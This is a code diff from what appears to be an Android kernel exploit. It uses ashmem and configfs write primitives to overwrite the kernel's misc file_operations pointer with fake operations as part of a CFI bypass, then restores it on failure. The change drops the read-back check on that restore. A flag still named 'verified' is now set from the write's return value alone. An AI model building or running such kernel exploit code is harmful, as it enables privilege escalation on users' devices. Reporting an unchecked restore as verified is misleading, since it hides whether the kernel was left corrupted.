@@ -248,9 +248,6 @@ int try_cfi_stage(void) {
   cfi_attempts++;
   int fd = open_ashmem_device();
   int dirty = 0;
-#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
-  int can_read_back = 0;
-#endif
 
   if (fd < 0) {
     cfi_last_step = 11;
@@ -292,9 +289,6 @@ int try_cfi_stage(void) {
     goto fail;
   }
   cfi_read_slot_ret = sizeof(uint64_t);
-#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
-  can_read_back = 1;
-#endif
 
   char readback[sizeof(payload)];
   memset(readback, 0, sizeof(readback));
@@ -419,27 +413,14 @@ fail:
     }
     cfi_restore_ret = configfs_write_once(
         fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
-    if (cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-      cfi_restore_verified =
-          verify_p0_pipe_data_page(data_addr(ASHMEM_MISC_FOPS),
-                                   original_fops_fail) == 1;
-#else
-      uint64_t after_fail = 0;
-      if (can_read_back &&
-          configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
-              (ssize_t)sizeof(after_fail)) {
-        fops_after = after_fail;
-        cfi_restore_verified = after_fail == original_fops_fail;
-      }
-#endif
-    }
+    cfi_restore_verified =
+        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail);
     if (dirty) {
       uint64_t null_owner_fail = 0;
       cfi_owner_ret = configfs_write_once(
           fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
     }
-    pr_warning("cfi restore-on-fail step=%d ret=%zd verified=%d "
+    pr_warning("cfi restore-on-fail step=%d ret=%zd ok=%d "
                "target=%016zx want=%016llx errno=%d\n",
                cfi_last_step, cfi_restore_ret, cfi_restore_verified,
                misc_fops, (unsigned long long)original_fops_fail, errno);
